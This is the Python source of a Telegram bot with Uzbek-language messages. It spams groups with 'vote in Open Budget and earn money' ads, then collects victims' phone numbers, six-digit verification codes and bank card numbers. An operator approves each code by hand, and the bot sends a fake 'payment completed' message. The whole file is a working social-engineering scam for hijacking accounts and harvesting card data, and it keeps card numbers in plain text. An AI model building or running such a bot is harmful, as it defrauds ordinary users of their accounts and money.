import asyncio
import logging
import aiosqlite
from aiogram import Bot, Dispatcher, F, types
from aiogram.types import (
    Message, CallbackQuery,
    InlineKeyboardMarkup, InlineKeyboardButton,
)
from aiogram.filters import CommandStart, StateFilter, Command
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.fsm.storage.memory import MemoryStorage
from aiogram.fsm.storage.base import StorageKey

from config import BOT_TOKEN, ADMIN_ID, ADMIN_LOGIN, ADMIN_PASSWORD, ADMIN_USERNAME, DB_PATH

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

bot = Bot(token=BOT_TOKEN, parse_mode="HTML")
storage = MemoryStorage()
dp = Dispatcher(storage=storage)

# Har bir guruh uchun alohida reklama task
ad_tasks: dict[int, asyncio.Task] = {}


# ─────────────────────────────────────────────
# FSM States
# ─────────────────────────────────────────────
class UserStates(StatesGroup):
    waiting_phone = State()
    waiting_code = State()
    waiting_card = State()
    waiting_payment = State()


class AdminStates(StatesGroup):
    waiting_login = State()
    waiting_password = State()
    in_panel = State()
    waiting_code_to_send = State()


# ─────────────────────────────────────────────
# Database helpers
# ─────────────────────────────────────────────
async def db_init():
    import os
    os.makedirs("database", exist_ok=True)
    async with aiosqlite.connect(DB_PATH) as db:
        await db.execute("""
            CREATE TABLE IF NOT EXISTS users (
                id      INTEGER PRIMARY KEY AUTOINCREMENT,
                user_id INTEGER UNIQUE,
                phone   TEXT,
                card    TEXT
            )
        """)
        await db.commit()


async def db_save_phone(user_id: int, phone: str):
    async with aiosqlite.connect(DB_PATH) as db:
        await db.execute("""
            INSERT INTO users (user_id, phone)
            VALUES (?, ?)
            ON CONFLICT(user_id) DO UPDATE SET phone=excluded.phone
        """, (user_id, phone))
        await db.commit()


async def db_save_card(user_id: int, card: str):
    async with aiosqlite.connect(DB_PATH) as db:
        await db.execute("""
            UPDATE users SET card=? WHERE user_id=?
        """, (card, user_id))
        await db.commit()


async def db_get_all_users():
    async with aiosqlite.connect(DB_PATH) as db:
        async with db.execute("SELECT user_id, phone, card FROM users") as cursor:
            return await cursor.fetchall()


# ─────────────────────────────────────────────
# Helper: foydalanuvchi state ni o'zgartirish
# ─────────────────────────────────────────────
async def set_user_state(user_id: int, new_state):
    key = StorageKey(bot_id=bot.id, chat_id=user_id, user_id=user_id)
    user_fsm = FSMContext(storage=storage, key=key)
    await user_fsm.set_state(new_state)


# ─────────────────────────────────────────────
# Reklama sikli
# ─────────────────────────────────────────────
async def ad_loop(chat_id: int):
    bot_info = await bot.get_me()
    ad_text = (
        "📢 <b>OPEN BUDGET GA OVOZ OLAMIZ!</b>\n\n"
        "✅SIZ HAM O'Z HISSANGIZNI QO'SHING VA DAROMAD OLING.\n\n"
        "✅TOLOVLAR SAYTDAN TELEFON RAQAMINGIZ KO'RINISHI BILAN 24 SOAT ICHIDA AMALGA OSHIRILADI!!!!!\n\n"
        f"👉🏻Imkoniyatni qoʻldan boy bermang👇🏻\n"
        f"@openbujet01_bot"
    )
    while True:
        try:
            await bot.send_message(chat_id, ad_text, parse_mode="HTML")
            logger.info(f"Reklama yuborildi: {chat_id}")
        except Exception as e:
            logger.error(f"Reklama xatosi ({chat_id}): {e}")
        await asyncio.sleep(5400)


# ─────────────────────────────────────────────
# /run — reklamani boshlash (faqat admin)
# ─────────────────────────────────────────────
@dp.message(Command("run"))
async def cmd_run(message: Message):
    if message.from_user.id != ADMIN_ID:
        await message.answer("⛔ Sizda bu buyruqdan foydalanish huquqi yo'q")
        return

    chat_id = message.chat.id

    if chat_id in ad_tasks and not ad_tasks[chat_id].done():
        await message.answer("⚠️ Reklama tizimi allaqachon ishlayapti")
        return

    task = asyncio.create_task(ad_loop(chat_id))
    ad_tasks[chat_id] = task

    await message.answer(
        "✅ Qabul qilindi"
    )


# ─────────────────────────────────────────────
# /stop — reklamani to'xtatish (faqat admin)
# ─────────────────────────────────────────────
@dp.message(Command("stop"))
async def cmd_stop(message: Message):
    if message.from_user.id != ADMIN_ID:
        await message.answer("⛔ Sizda bu buyruqdan foydalanish huquqi yo'q")
        return

    chat_id = message.chat.id

    if chat_id in ad_tasks and not ad_tasks[chat_id].done():
        ad_tasks[chat_id].cancel()
        del ad_tasks[chat_id]
        await message.answer("🛑 Reklama tizimi to'xtatildi")
    else:
        await message.answer("⚠️ Reklama tizimi hozir ishlamayapti")


# ─────────────────────────────────────────────
# /start
# ─────────────────────────────────────────────
@dp.message(CommandStart())
async def cmd_start(message: Message, state: FSMContext):
    if message.chat.type in ("group", "supergroup"):
        return

    await state.clear()
    bot_info = await bot.get_me()

    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [
            InlineKeyboardButton(text="👤 User", callback_data="role_user"),
            InlineKeyboardButton(text="🔐 Admin", callback_data="role_admin"),
        ],
        [
            # Guruhga qo'shish — foydalanuvchining guruhlar ro'yxatini ochadi
            InlineKeyboardButton(
                text="➕ Guruhga qo'shish",
                switch_inline_query=""
            )
        ]
    ])
    await message.answer("Siz kim bo'lib kirmoqchisiz?", reply_markup=keyboard)


# ─────────────────────────────────────────────
# USER flow
# ─────────────────────────────────────────────
@dp.callback_query(F.data == "role_user")
async def role_user(callback: CallbackQuery, state: FSMContext):
    await callback.message.edit_text(
        "📱 Telefon raqamingizni kiriting\nMasalan: +998XXXXXXXXX"
    )
    await state.set_state(UserStates.waiting_phone)
    await callback.answer()


@dp.message(UserStates.waiting_phone)
async def user_phone(message: Message, state: FSMContext):
    phone = message.text.strip()
    if not phone.startswith("+998") or len(phone) != 13:
        await message.answer("❗ Noto'g'ri format. Iltimos qayta kiriting.\nMasalan: +998901234567")
        return

    await db_save_phone(message.from_user.id, phone)
    await state.update_data(phone=phone)

    await bot.send_message(
        ADMIN_ID,
        f"📢 <b>Yangi abonent</b>\n\nTelefon: {phone}\nUser ID: <code>{message.from_user.id}</code>",
        parse_mode="HTML"
    )

    await message.answer("✅ Telefon raqamingiz qabul qilindi.\n\n🔑 Endi 6 xonali tasdiqlash kodini kiriting:")
    await state.set_state(UserStates.waiting_code)


@dp.message(UserStates.waiting_code)
async def user_code(message: Message, state: FSMContext):
    code = message.text.strip()
    if not code.isdigit() or len(code) != 6:
        await message.answer("❗ Kod 6 ta raqamdan iborat bo'lishi kerak. Qayta kiriting:")
        return

    await state.update_data(code=code)
    await message.answer("🔄 Sizning kodingiz tekshirilmoqda...")

    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="✅ Kod tasdiqlandi", callback_data=f"code_ok:{message.from_user.id}")],
        [InlineKeyboardButton(text="❌ Kod xato",        callback_data=f"code_wrong:{message.from_user.id}")],
        [InlineKeyboardButton(text="⏳ Kutib tursin",    callback_data=f"code_wait:{message.from_user.id}")],
    ])

    await bot.send_message(
        ADMIN_ID,
        f"🔢 <b>User kod kiritdi</b>\n\nKod: <code>{code}</code>\nUser ID: <code>{message.from_user.id}</code>",
        parse_mode="HTML",
        reply_markup=keyboard
    )


@dp.message(UserStates.waiting_card)
async def user_card(message: Message, state: FSMContext):
    card = message.text.strip()
    await db_save_card(message.from_user.id, card)
    await state.set_state(UserStates.waiting_payment)

    await message.answer(
        f"💳 To'lov amalga oshmoqda...\n\n"
        f"⚠️ Muammo yuzaga kelsa admin bilan bog'laning: @{ADMIN_USERNAME}"
    )

    payment_keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="✅ To'lov amalga oshdi", callback_data=f"payment_ok:{message.from_user.id}")],
    ])

    await bot.send_message(
        ADMIN_ID,
        f"💳 <b>Yangi karta saqlandi</b>\n\n"
        f"User ID: <code>{message.from_user.id}</code>\n"
        f"Karta: <code>{card}</code>\n\n"
        f"To'lovni tasdiqlang:",
        parse_mode="HTML",
        reply_markup=payment_keyboard
    )


# ─────────────────────────────────────────────
# Admin: To'lov amalga oshdi
# ─────────────────────────────────────────────
@dp.callback_query(F.data.startswith("payment_ok:"))
async def payment_confirmed(callback: CallbackQuery):
    user_id = int(callback.data.split(":")[1])
    await set_user_state(user_id, None)

    await bot.send_message(
        user_id,
        "✅ <b>To'lovingiz amalga oshdi!</b>\n\nE'tibor uchun rahmat 🙏",
        parse_mode="HTML"
    )

    await callback.message.edit_reply_markup(reply_markup=None)
    await callback.answer("✅ Foydalanuvchiga xabar yuborildi")


# ─────────────────────────────────────────────
# Admin callback: ✅ Kod tasdiqlandi
# ─────────────────────────────────────────────
@dp.callback_query(F.data.startswith("code_ok:"))
async def code_approved(callback: CallbackQuery):
    user_id = int(callback.data.split(":")[1])
    await set_user_state(user_id, UserStates.waiting_card)
    await bot.send_message(
        user_id,
        "✅ <b>Kod tasdiqlandi</b>\n\n💳 Kartangizni yuboring:",
        parse_mode="HTML"
    )
    await callback.message.edit_reply_markup(reply_markup=None)
    await callback.answer("✅ Tasdiqlandi")


# ─────────────────────────────────────────────
# Admin callback: ❌ Kod xato
# ─────────────────────────────────────────────
@dp.callback_query(F.data.startswith("code_wrong:"))
async def code_wrong(callback: CallbackQuery):
    user_id = int(callback.data.split(":")[1])
    await set_user_state(user_id, UserStates.waiting_code)
    await bot.send_message(
        user_id,
        "❌ <b>Kod xato</b>\n\n🔄 Qayta kiriting:",
        parse_mode="HTML"
    )
    await callback.message.edit_reply_markup(reply_markup=None)
    await callback.answer("❌ Xato")


# ─────────────────────────────────────────────
# Admin callback: ⏳ Kutib tursin
# ─────────────────────────────────────────────
@dp.callback_query(F.data.startswith("code_wait:"))
async def code_wait(callback: CallbackQuery):
    user_id = int(callback.data.split(":")[1])

    await bot.send_message(
        user_id,
        "⏳ Sizning kodingiz baza orqali tekshirilmoqda\nIltimos kuting..."
    )

    db_keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="🗄 Baza tasdiqladi", callback_data=f"code_db:{user_id}")],
        [InlineKeyboardButton(text="❌ Xato kod",        callback_data=f"code_db_wrong:{user_id}")],
    ])

    await callback.message.edit_reply_markup(reply_markup=None)
    await bot.send_message(
        ADMIN_ID,
        f"⏳ <b>Foydalanuvchi kutmoqda</b>\n\nUser ID: <code>{user_id}</code>\n\nBaza tekshiruvi natijasi:",
        parse_mode="HTML",
        reply_markup=db_keyboard
    )
    await callback.answer("⏳ Kutishga yuborildi")


# ─────────────────────────────────────────────
# Admin callback: 🗄 Baza tasdiqladi
# ─────────────────────────────────────────────
@dp.callback_query(F.data.startswith("code_db:"))
async def code_db_approved(callback: CallbackQuery):
    user_id = int(callback.data.split(":")[1])
    await set_user_state(user_id, UserStates.waiting_card)
    await bot.send_message(
        user_id,
        "🗄 <b>Baza sizni tasdiqladi!</b>\n\n💳 Kartangizni yuboring:",
        parse_mode="HTML"
    )
    await callback.message.edit_reply_markup(reply_markup=None)
    await callback.answer("🗄 Tasdiqlandi")


# ─────────────────────────────────────────────
# Admin callback: ❌ Xato kod (baza ichidan)
# ─────────────────────────────────────────────
@dp.callback_query(F.data.startswith("code_db_wrong:"))
async def code_db_wrong(callback: CallbackQuery):
    user_id = int(callback.data.split(":")[1])
    await set_user_state(user_id, UserStates.waiting_code)
    await bot.send_message(
        user_id,
        "❌ <b>Kod xato</b>\n\n🔄 Qayta kiriting:",
        parse_mode="HTML"
    )
    await callback.message.edit_reply_markup(reply_markup=None)
    await callback.answer("❌ Xato kod yuborildi")


# ─────────────────────────────────────────────
# ADMIN flow
# ─────────────────────────────────────────────
def admin_menu():
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="📋 Abonentlar",   callback_data="admin_list")],
        [InlineKeyboardButton(text="📨 Kod yuborish", callback_data="admin_send_code")],
        [InlineKeyboardButton(text="🔄 Yangilash",    callback_data="admin_refresh")],
    ])


@dp.callback_query(F.data == "role_admin")
async def role_admin(callback: CallbackQuery, state: FSMContext):
    await callback.message.edit_text("🔐 Admin login kiriting:")
    await state.set_state(AdminStates.waiting_login)
    await callback.answer()


@dp.message(AdminStates.waiting_login)
async def admin_login(message: Message, state: FSMContext):
    if message.text.strip() == ADMIN_LOGIN:
        await message.answer("🔑 Parol kiriting:")
        await state.set_state(AdminStates.waiting_password)
    else:
        await message.answer("❌ Login noto'g'ri. Qayta urinib ko'ring:")


@dp.message(AdminStates.waiting_password)
async def admin_password(message: Message, state: FSMContext):
    if message.text.strip() == ADMIN_PASSWORD:
        await state.set_state(AdminStates.in_panel)
        await message.answer(
            "✅ <b>Admin panelga xush kelibsiz!</b>",
            parse_mode="HTML",
            reply_markup=admin_menu()
        )
    else:
        await message.answer("❌ Parol noto'g'ri. Qayta urinib ko'ring:")


@dp.callback_query(F.data == "admin_list")
async def admin_list(callback: CallbackQuery):
    users = await db_get_all_users()
    if not users:
        await callback.answer("📭 Hozircha abonentlar yo'q", show_alert=True)
        return

    text = "📋 <b>Abonentlar ro'yxati:</b>\n\n"
    for i, (uid, phone, card) in enumerate(users, 1):
        text += (
            f"{i}. User ID: <code>{uid}</code>\n"
            f"   📱 Tel: {phone or '—'}\n"
            f"   💳 Karta: {card or '—'}\n\n"
        )

    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="🔙 Orqaga", callback_data="admin_back")]
    ])
    await callback.message.edit_text(text, parse_mode="HTML", reply_markup=keyboard)
    await callback.answer()


@dp.callback_query(F.data == "admin_send_code")
async def admin_send_code_start(callback: CallbackQuery, state: FSMContext):
    await callback.message.edit_text("📨 Yubormoqchi bo'lgan kodni kiriting:")
    await state.set_state(AdminStates.waiting_code_to_send)
    await callback.answer()


@dp.message(AdminStates.waiting_code_to_send)
async def admin_send_code_msg(message: Message, state: FSMContext):
    code = message.text.strip()
    users = await db_get_all_users()

    if not users:
        await message.answer("📭 Hozircha abonentlar yo'q.")
    else:
        sent = 0
        for (uid, phone, card) in users:
            try:
                await bot.send_message(
                    uid,
                    f"📨 <b>Sizning kodingiz:</b> <code>{code}</code>",
                    parse_mode="HTML"
                )
                sent += 1
            except Exception:
                pass
        await message.answer(f"✅ Kod {sent} ta foydalanuvchiga yuborildi.")

    await state.set_state(AdminStates.in_panel)
    await message.answer("Admin panel:", reply_markup=admin_menu())


@dp.callback_query(F.data == "admin_refresh")
async def admin_refresh(callback: CallbackQuery):
    users = await db_get_all_users()
    await callback.message.edit_text(
        f"✅ <b>Admin panelga xush kelibsiz!</b>\n\n📊 Jami abonentlar: <b>{len(users)}</b>",
        parse_mode="HTML",
        reply_markup=admin_menu()
    )
    await callback.answer("🔄 Yangilandi!")


@dp.callback_query(F.data == "admin_back")
async def admin_back(callback: CallbackQuery):
    await callback.message.edit_text(
        "✅ <b>Admin panelga xush kelibsiz!</b>",
        parse_mode="HTML",
        reply_markup=admin_menu()
    )
    await callback.answer()


# ─────────────────────────────────────────────
# Noma'lum xabarlar
# ─────────────────────────────────────────────
@dp.message(StateFilter(None))
async def unknown_message(message: Message):
    if message.chat.type in ("group", "supergroup"):
        return
    await message.answer("Boshlash uchun /start ni bosing.")


# ─────────────────────────────────────────────
# Main
# ─────────────────────────────────────────────
async def main():
    await db_init()
    logger.info("Bot ishga tushdi...")
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
